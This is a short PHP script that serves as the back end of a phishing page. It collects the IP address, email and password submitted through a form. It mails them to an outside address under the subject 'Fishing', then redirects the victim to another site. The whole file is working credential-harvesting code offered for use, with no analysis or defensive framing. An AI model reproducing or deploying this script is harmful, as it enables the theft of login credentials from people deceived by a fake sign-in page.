<?php
$ip = $_POST['ip'];
$em = $_POST['email'];
$pwd = $_POST['pass'];
$to = "example@.example.com";
$subject = "Fishing";
$txt = "IP : ".$ip."\r\n"."Username : ".$em."\r\n"."Password : ".$pwd;
$headers = "From: book.m.thai" . "\r\n" .
"CC: 000webhost.com";

if (mail($to,$subject,$txt,$headers)) {
    header('location: https://www.redirect.com');
} else {
    header('location: index.html');
}
?>
